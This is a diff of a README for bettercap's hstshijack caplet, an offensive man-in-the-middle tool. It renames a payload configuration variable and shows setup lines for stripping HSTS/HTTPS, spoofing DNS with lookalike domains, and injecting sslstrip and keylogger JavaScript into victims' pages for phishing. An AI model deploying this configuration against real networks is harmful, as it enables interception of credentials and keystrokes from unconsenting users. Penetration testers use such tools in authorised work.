@@ -6,14 +6,13 @@
 
 ```sh
 set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
-set hstshijack.payload         /usr/local/share/bettercap/caplets/hstshijack/payloads/hstshijack-payload.js
 set hstshijack.ignore          *
 set hstshijack.targets         *.com, *.co.uk
 set hstshijack.replacements    *.corn,*.cc.uk
 #set hstshijack.blockscripts    facebook.com,*.facebook.com
 set hstshijack.obfuscate       false
 set hstshijack.encode          true
-set hstshijack.custompayloads  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
+set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
 
 set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
 set dns.spoof.domains  *.corn,*.cc.uk
@@ -24,7 +23,7 @@ dns.spoof   on
 
 ### Core payload
 
-This module injects HTML & JS files with a payload (<a href="./payloads/hstshijack-payload.js">**hstshijack-payload.js**</a>) that replaces targeted hostnames with spoofed ones, and communicates with bettercap, revealing all URLs that were discovered in the injected document.
+This module injects HTML & JS files with a payload that replaces targeted hostnames with spoofed ones, and communicates with bettercap, revealing all URLs that were discovered in the injected document.
 
 When bettercap receives a callback with a new URL, it sends a HEAD request to learn whether the host in this URL sends HTTPS redirects, and keeps a log.
 
@@ -32,12 +31,12 @@ This is done so that bettercap can know whether it should MITM an SSL connection
 
 ### Custom payloads
 
-You can also inject your own JavaScript payloads into HTML & JS files from specific hosts by assigning them to the `hstshijack.custompayloads` variable.
+You can also inject your own JavaScript payloads into HTML & JS files from specific hosts by assigning them to the `hstshijack.payloads` variable.
 
 Example:
 
 ```sh
-hstshijack.custompayloads *:hstshijack/payloads/sslstrip.js,google.com:hstshijack/payloads/google.js,*.google.com:hstshijack/payloads/google.js
+hstshijack.payloads *:hstshijack/payloads/sslstrip.js,google.com:hstshijack/payloads/google.js,*.google.com:hstshijack/payloads/google.js
 ```
 
 Once the payload is injected into a page, you can technically phish any data unless the client navigates to a URL that either has strict transport security rules enforced by their browser, or the URL was not stripped due to JavaScript security.
